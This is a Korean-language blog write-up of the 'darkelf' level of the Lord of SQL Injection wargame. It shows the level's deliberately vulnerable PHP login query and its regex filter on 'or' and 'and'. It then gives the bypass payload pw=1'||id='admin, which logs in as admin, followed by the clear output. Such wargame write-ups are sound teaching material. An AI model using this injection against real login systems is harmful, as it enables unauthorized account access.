---
title: "[Lord of SQL Injection] LoS - darkelf 문제풀이"
date: 2018-07-25
draft: false
category: [wargame]
subcategories: [lord-of-sql-injection]
tags: [Write-up, Lord of SQL Injection]
---

다음 문제는 `darkelf` 이다.
이번 문제는 이 전 문제와 동일한 풀이 방법으로 풀 수 있었다.  

<!--more-->

코드는 다음과 같다.  

```php
----------------------------------------------------------------------------------
query : select id from prob_darkelf where id='guest' and pw=''
----------------------------------------------------------------------------------

<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect();  
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_darkelf where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("darkelf"); 
  highlight_file(__FILE__); 
?>
```

이 전에는 `공백`에 필터링이 있었지만 이번에는 `or`과 `and`에 필터링이 있다.
`worfman` 문제에서는 `공백`을 사용하지 않기 위해 `||`을 사용했었는데, 이번에는 `or` 문자열을 사용하지 않기 위해 `||`을 사용하면 될 것 같다.
이 전 문제와 동일하게 URL 뒤에 아래와 같이 입력 해 주었다.  

```plain
?pw=1'||id='admin
```

---

```php
--------------------------------------------------------------------------------------------------
query : select id from prob_darkelf where id='guest' and pw='1'||id='admin'
--------------------------------------------------------------------------------------------------

Hello admin
DARKELF Clear!
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect();  
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_darkelf where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("darkelf"); 
  highlight_file(__FILE__); 
?>
```

---

```plain
DARKELF Clear!!
```